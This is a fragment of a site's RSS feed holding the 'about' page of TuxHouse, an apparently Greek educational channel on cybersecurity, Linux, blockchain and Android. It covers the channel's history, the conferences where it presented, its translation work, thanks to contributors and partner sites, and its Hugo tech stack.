&lt;p>&lt;img src="/img/series.jpg" alt="">&lt;/p>
&lt;h3 id="presenter-at-the-conferences">Presenter at the Conferences:&lt;/h3>
&lt;p>&lt;a href="https://2021.fosscomm.gr/index.html">FOSSCOMM 2021&lt;/a> | &lt;a href="https://www.pychain.org/">PyChain 2022&lt;/a> | &lt;a href="https://2022.fosscomm.gr/en/">FOSSCOMM 2022&lt;/a> | &lt;a href="https://fosdem.org/2023/">FOSSDEM 2023&lt;/a> | &lt;a href="https://2023.fosscomm.gr/">FOSSCOMM 2023&lt;/a>&lt;/p>
&lt;h3 id="translating-in">Translating in:&lt;/h3>
&lt;p>Jebroa | Ethereum.org | SnapDrop | CrDroid | DivestOS | BTCMap | Lemmy | Element | Hypatia | IRR | Fedora | Extiparter&lt;/p></content></item><item><title>TuxHouse</title><link>/about/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/about/</guid><description>🏠 TuxHouse TuxHouse is an educational platform 🎓 that provides free educational videos 📺 and e-books 📚 about cybersecurity 🔒, blockchain ⛓, Linux 🐧 and Android 📱.
🎬 Our Journey The channel began its journey as DimitrisV back in 2014, primarily as an Android Hacking Channel 📱🔒. Eager to broaden our scope and bring more valuable content to our community, we underwent a rebranding process, emerging as TuxHouse 🏠 in late 2022.</description><content>&lt;h1 id="-tuxhouse">🏠 TuxHouse&lt;/h1>
&lt;p>TuxHouse is an educational platform 🎓 that provides &lt;em>free&lt;/em> educational videos 📺 and e-books 📚 about cybersecurity 🔒, blockchain ⛓, Linux 🐧 and Android 📱.&lt;/p>
&lt;h2 id="-our-journey">🎬 Our Journey&lt;/h2>
&lt;p>The channel began its journey as &lt;strong>DimitrisV&lt;/strong> back in 2014, primarily as an Android Hacking Channel 📱🔒. Eager to broaden our scope and bring more valuable content to our community, we underwent a rebranding process, emerging as &lt;strong>TuxHouse&lt;/strong> 🏠 in late 2022. Since the rebranding, we&amp;rsquo;ve released a plethora of new episodes, including full-courses and shorts, covering a wider range of topics.&lt;/p>
&lt;h2 id="-contributors">🤝 Contributors&lt;/h2>
&lt;p>Our journey wouldn&amp;rsquo;t have been the same without the immense support and contributions from our beloved community. Here&amp;rsquo;s a shout-out to them:&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Contributor Name&lt;/th>
&lt;th>Number of Episodes&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Loukas Theotokatos&lt;/td>
&lt;td>7&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Kyriakos Giannakis - Flare.gr&lt;/td>
&lt;td>6&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Kyriakos Tsitiridis&lt;/td>
&lt;td>5&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Abraam Tsitiridis&lt;/td>
&lt;td>5&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Stavros Gkinos&lt;/td>
&lt;td>4&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Nikos Vagiakakos (SV1EIG)&lt;/td>
&lt;td>4&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Pavlos Spyridakos&lt;/td>
&lt;td>3&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Panagiotis Makromanolis&lt;/td>
&lt;td>3&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Konstantinos Karahalis&lt;/td>
&lt;td>3&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Christos Skamatzouras&lt;/td>
&lt;td>2&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Andreas Georgarakia&lt;/td>
&lt;td>1&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Christina Paschou&lt;/td>
&lt;td>1&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>John Karvelas&lt;/td>
&lt;td>1&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Noel Macwan&lt;/td>
&lt;td>1&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Kontsantinos Kostas&lt;/td>
&lt;td>1&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Konstantinos GeroKwstas (SV1SJH)&lt;/td>
&lt;td>1&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>&lt;em>This list will be updated as more people contribute to our journey. Thank you, everyone, for your endless support and contributions! 🙏&lt;/em>&lt;/p>
&lt;p>We&amp;rsquo;d also like to give a special thanks to the following websites:&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Website&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>linux-insider.gr&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>linux-user.gr&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Cerebrux&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Funkybit.gr&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>dwrean.net&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>Your support and collaborations have immensely contributed to our journey and we look forward to more fruitful partnerships in the future! 🚀&lt;/p>
&lt;h2 id="-tech-stack">🚀 Tech Stack&lt;/h2>
&lt;p>This website has been proudly built using &lt;a href="https://gohugo.io/">Hugo&lt;/a>, a fast and modern static site generator, built with Go 🚀. Go&amp;rsquo;s efficiency and strong support for concurrent programming make Hugo the ideal choice for building this platform.&lt;/p>
&lt;p>We&amp;rsquo;re also utilizing the sleek and minimalist &lt;a href="https://github.com/panr/hugo-theme-terminal">Terminal theme&lt;/a> by panr to deliver you a user-friendly and aesthetically pleasing experience.&lt;/p>
&lt;p>A big shout-out 🙌 to these fantastic tools that make my personal web site possible!&lt;/p></content></item></channel></rss>